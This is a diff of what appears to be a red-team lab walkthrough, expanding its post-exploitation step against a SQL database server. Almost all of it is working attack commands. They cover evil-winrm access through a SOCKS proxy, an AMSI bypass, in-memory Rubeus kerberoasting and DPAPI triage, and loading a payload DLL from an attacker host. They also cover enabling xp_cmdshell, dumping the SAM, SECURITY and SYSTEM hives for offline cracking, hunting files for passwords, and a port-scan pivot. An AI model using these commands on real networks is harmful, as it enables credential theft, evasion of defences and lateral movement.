@@ -532,31 +532,150 @@ execute -o powershell -c "$cred=New-Object PSCredential('contoso\svc.mssql',(Con
 
 ## Step 11: Post-Exploitation on DBServer
 
-From evil-winrm or Sliver session:
+### 11a: Connect via evil-winrm (from Kali through SOCKS proxy)
+
+```bash
+# Start SOCKS proxy in Sliver session first: socks5 start -p 1080
+# Then from Kali:
+proxychains evil-winrm -i 10.1.0.100 -u 'contoso\svc.mssql' -p 'CRACKED_PASSWORD'
+```
+
+### 11b: evil-winrm Built-in Commands
+
+```ruby
+# Upload files to target
+upload /home/kali/tools/SharpHound.exe C:\Windows\Temp\sh.exe
+upload /home/kali/tools/Rubeus.exe C:\Windows\Temp\r.exe
+
+# Download files from target
+download C:\Windows\Temp\loot.zip /home/kali/loot/
+
+# Load PowerShell scripts into memory (dot-source)
+Bypass-4MSI                          # Built-in AMSI bypass
+menu                                 # Show all evil-winrm commands
+
+# Execute .NET assemblies in memory (no file on disk)
+Invoke-Binary /home/kali/tools/Rubeus.exe kerberoast /format:hashcat /nowrap
+Invoke-Binary /home/kali/tools/Seatbelt.exe -group=all
+Invoke-Binary /home/kali/tools/SharpUp.exe audit
+Invoke-Binary /home/kali/tools/Certify.exe find /vulnerable
+Invoke-Binary /home/kali/tools/SharpDPAPI.exe triage
+
+# Load DLLs in memory
+Dll-Loader -http http://YOUR_IP:8080/payload.dll
+Dll-Loader -smb \\YOUR_IP\share\payload.dll
+Dll-Loader -local C:\Windows\Temp\payload.dll
+
+# PowerShell script loading (downloads and dot-sources)
+# Place .ps1 files in a directory, pass with -s flag on connect:
+# proxychains evil-winrm -i 10.1.0.100 -u user -p pass -s /home/kali/ps-scripts/
+# Then inside evil-winrm:
+PowerView.ps1                        # Load PowerView
+Invoke-Kerberoast                     # Run loaded function
+```
+
+### 11c: Recon from DBServer
 
 ```powershell
-# SQL databases
+# System info
+systeminfo
+whoami /all
+hostname
+ipconfig /all
+
+# Local users and groups
+net localgroup administrators
+net user
+Get-LocalUser | Format-Table Name, Enabled, LastLogon
+
+# Running services
+Get-Service | Where-Object {$_.Status -eq 'Running'} | Select Name, DisplayName | Sort DisplayName
+
+# Scheduled tasks (non-Microsoft)
+Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*'} | Select TaskName, State
+
+# Network connections
+netstat -ano | findstr ESTABLISHED
+
+# Installed software
+Get-WmiObject Win32_Product | Select Name, Version | Sort Name
+
+# AV status
+Get-MpComputerStatus | Select AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, RealTimeProtectionEnabled
+```
+
+### 11d: SQL Server Enumeration
+
+```powershell
+# Connect to SQL
 $c = New-Object System.Data.SqlClient.SqlConnection
 $c.ConnectionString = 'Server=localhost;Integrated Security=True'
 $c.Open()
+
+# List databases
 $cmd = $c.CreateCommand(); $cmd.CommandText = 'SELECT name FROM sys.databases'
 $rd = $cmd.ExecuteReader(); while($rd.Read()) { $rd[0] }; $rd.Close()
 
-# sysadmin check
+# Check sysadmin
 $cmd2 = $c.CreateCommand(); $cmd2.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"
-$cmd2.ExecuteScalar()
+Write-Output "sysadmin: $($cmd2.ExecuteScalar())"
 
-# Linked servers
-$cmd3 = $c.CreateCommand(); $cmd3.CommandText = 'SELECT name, data_source FROM sys.servers WHERE is_linked=1'
-$rd3 = $cmd3.ExecuteReader(); while($rd3.Read()) { "$($rd3[0]) -> $($rd3[1])" }; $rd3.Close()
+# SQL logins
+$cmd3 = $c.CreateCommand(); $cmd3.CommandText = "SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G')"
+$rd3 = $cmd3.ExecuteReader(); while($rd3.Read()) { "$($rd3[0]) ($($rd3[1]))" }; $rd3.Close()
+
+# Linked servers (pivot further!)
+$cmd4 = $c.CreateCommand(); $cmd4.CommandText = 'SELECT name, data_source FROM sys.servers WHERE is_linked=1'
+$rd4 = $cmd4.ExecuteReader(); while($rd4.Read()) { "$($rd4[0]) -> $($rd4[1])" }; $rd4.Close()
+
+# xp_cmdshell (if sysadmin)
+$cmd5 = $c.CreateCommand()
+$cmd5.CommandText = "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
+$cmd5.ExecuteNonQuery() | Out-Null
+$cmd6 = $c.CreateCommand(); $cmd6.CommandText = "EXEC xp_cmdshell 'whoami && hostname && ipconfig'"
+$rd6 = $cmd6.ExecuteReader(); while($rd6.Read()) { if($rd6[0]) { $rd6[0] } }; $rd6.Close()
+
+# Search for sensitive data
+$cmd7 = $c.CreateCommand(); $cmd7.CommandText = "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES"
+$rd7 = $cmd7.ExecuteReader(); while($rd7.Read()) { "$($rd7[0]).$($rd7[1])" }; $rd7.Close()
+
 $c.Close()
+```
 
-# Local admins
-net localgroup administrators
+### 11e: Credential Harvesting on DBServer
 
-# Cred dump
-mimikatz sekurlsa::logonpasswords
-hashdump
+```powershell
+# SAM + LSA secrets (reg save method — works without tools)
+reg save HKLM\SAM C:\Windows\Temp\sam
+reg save HKLM\SECURITY C:\Windows\Temp\sec
+reg save HKLM\SYSTEM C:\Windows\Temp\sys
+# Download via evil-winrm:
+# download C:\Windows\Temp\sam /home/kali/loot/
+# download C:\Windows\Temp\sec /home/kali/loot/
+# download C:\Windows\Temp\sys /home/kali/loot/
+# On Kali: secretsdump.py -sam sam -security sec -system sys LOCAL
+
+# Cached domain credentials
+cmdkey /list
+
+# LSA secrets keys
+Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -ExpandProperty PSChildName
+
+# Search for passwords in files
+Get-ChildItem C:\ -Recurse -Include *.txt,*.xml,*.config,*.ini,*.ps1 -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|credential|secret" -List | Select Path
+```
+
+### 11f: Pivot Further from DBServer
+
+```powershell
+# Port scan other hosts from DBServer vantage point
+@(10,20,25) | ForEach-Object { $ip = "10.1.0.$_"; @(445,5985,3389,88,389) | ForEach-Object { $c = New-Object Net.Sockets.TcpClient; $r = $c.BeginConnect($ip,$_,$null,$null); $w = $r.AsyncWaitHandle.WaitOne(1000,$false); if($w -and $c.Connected) { Write-Output "$ip`:$_ OPEN"; $c.Close() } } }
+
+# Check domain trust from DBServer
+nltest /domain_trusts /all_trusts
+
+# Look for other SQL instances
+Get-Service | Where-Object {$_.DisplayName -like '*SQL*'} | Format-Table Name, Status, DisplayName
 ```
 
 ---
